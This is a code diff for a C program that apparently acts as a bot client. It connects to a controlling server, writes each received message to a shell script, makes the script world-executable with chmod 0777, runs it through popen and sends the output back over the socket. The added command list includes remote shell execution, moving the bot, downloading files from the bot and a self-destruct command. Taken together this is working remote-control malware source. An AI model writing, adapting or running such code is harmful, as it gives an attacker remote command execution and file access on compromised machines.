@@ -1,19 +1,18 @@
-#include<stdio.h>
-#include<string.h>    //strlen
+#include "../include/common.h"
+
 #include<sys/socket.h>
 #include<arpa/inet.h> //inet_addr
-#include <unistd.h>
-#include<stdlib.h> //atoi
+#include <sys/stat.h>
 
-#define OP_START '\x02'
-#define OP_STOP 'x'
+#define OP_START '\\x02'
+#define OP_STOP "\x03"
 struct message {
     char servermessage[150];
 }message;
-char *changecommand(char *text, int num);
+void *changecommand(char *text);
 int main(int argc , char *argv[])
 {
-    int socket_desc, lengthofmessage, index = 0, index1 = 0;
+    int socket_desc, index = 0, index1 = 0;
     struct sockaddr_in server;
     char message[2000], server_reply[2000], word_copy_message[150];
     int potnumber_client;
@@ -63,36 +62,43 @@ int main(int argc , char *argv[])
             printf("recieve failed");
         }
         //check message block to change some command
-        lengthofmessage = strlen(message);
-        char *messagereturn;
-        messagereturn = malloc(1000 * sizeof(char));
-        messagereturn = changecommand(message, lengthofmessage);
-        printf("%s", messagereturn);
+        changecommand(message);
+        printf("%s", message);
         //combine all message_box
         FILE *fp;
-        fp = fopen("server-message.txt", "w");
-        fputs(messagereturn, fp);
+        fp = fopen("server-message.sh", "w");
+        fputs(message, fp);
         fclose(fp);
+        char mode[] = "0777";
+        char buffer[100] = "server-message.sh";
+        int i;
+        i = strtol(mode, 0, 8);
+        if (chmod (buffer,i) < 0)
+        {
+            fprintf(stderr, "%s: error in chmod(%s, %s) - %d (%s)\n",
+                    argv[0], buffer, mode, errno, strerror(errno));
+            exit(1);
+        }
         //Send to server
         //After Client has recieve form server, Client write message back to server
-        printf("--- Sending init --- \n");
+        // printf("--- Sending init --- \n");
         char tmp[250],buf[250], messageget[250];
         //use popen in order to pointer to the first memory location that hold the results (results ---> value of message)
-        fp = fopen("server-message.txt", "r");
+        fp = fopen("server-message.sh", "r");
         fgets(messageget, 250, fp);
         fp = popen(messageget, "r");
         {
             //fgets use to read next input line to keep in charactor array with value MAXLINE - 1
-            while (fgets(buf, 2, fp))
+            while (fgets(buf, 200, fp))
             {
-            printf("%s:",buf);
+            // printf("%s:\n",buf);
             //If write(socket_desc , buf , strlen(buf)) < 0 it means client didn't send anything to server
             if( write(socket_desc , buf , strlen(buf)) < 0)
             {
                 printf("Send failed");
                 return 1;
             }
-            bzero(message,200);
+            bzero(message,2000);
             bzero(tmp,200);
             bzero(buf,200);
             }
@@ -100,11 +106,11 @@ int main(int argc , char *argv[])
         fclose(fp);
         //Stop sending
         //After Client send message to server
-        printf("Stop sent..\n");
+        // printf("Stop sent..\n");
         usleep(1000000); //1second
-        sprintf(message,"%c",OP_STOP);
-        printf("%s",message);
-        if( write(socket_desc , message ,2) < 0)
+        sprintf(message,"%s",OP_STOP);
+        // printf("%s\n",message);
+        if( write(socket_desc , message ,5) < 0)
         {
             printf("Send failed");
             return 1;
@@ -116,24 +122,59 @@ int main(int argc , char *argv[])
     printf("\n");
      
 }
-char *changecommand(char *text, int num) {
-    char text_build[1000];
-    int start_index, index = 0;
+void *changecommand(char *text) {
+    char text_build[1000], command_detail[500];
+    int start_index, index = 0, length;
     strcpy(text_build, text);
+    length = strlen(text);
     memset(text, 0, 2000);
+    memset(command_detail, 0, 500);
     if(text_build[0] == '/') {
         start_index = 1;
     } else {
         start_index = 0;
     }
-    for(start_index; start_index < num; start_index++) {
+    for(start_index; start_index < length; start_index++) {
         text[index] = text_build[start_index];
         index += 1;
         if(strcmp(text, "shell ") == 0) {
             memset(text, 0, 1000);
             index = 0;
+            strcpy(command_detail, "Exec shell commands with timeout.");
+        }else if(strcmp(text, "mvbot ") == 0) {
+            memset(text, 0, 1000);
+            index = 0;
+            strcpy(command_detail, "Move bot to custom location.");
+        }else if(strcmp(text, "timeout ") == 0) {
+            memset(text, 0, 1000);
+            index = 0;
+            strcpy(command_detail, "Set timeout for shell.");
+        } else if(strcmp(text, "help") == 0) {
+            strcpy(command_detail, "List of commands.");
         }
+        else if(strcmp(text, "cp") == 0) {
+            strcpy(command_detail, "Copy file/folder.");
+        }
+        else if(strcmp(text, "mv") == 0) {
+            strcpy(command_detail, "Move file/folder.");
+        }
+        else if(strcmp(text, "rm") == 0) {
+            strcpy(command_detail, "Remove file/folder.");
+        }
+        else if(strcmp(text, "mkdir") == 0) {
+            strcpy(command_detail, "Make directory.");
+        }
+        else if(strcmp(text, "getfile") == 0) {
+            strcpy(command_detail, "Download file from bot.");
+        }
+        else if(strcmp(text, "reserve") == 0) {
+            strcpy(command_detail, "Warning text that found in shell.");
+        }
+        else if(strcmp(text, "BOOM!") == 0) {
+            strcpy(command_detail, "DESTROY ITSELF!");
+        }
+        printf("%s", command_detail);
+        memset(command_detail, 0, 500);
     }
     index = 0;
-    return text;
 }
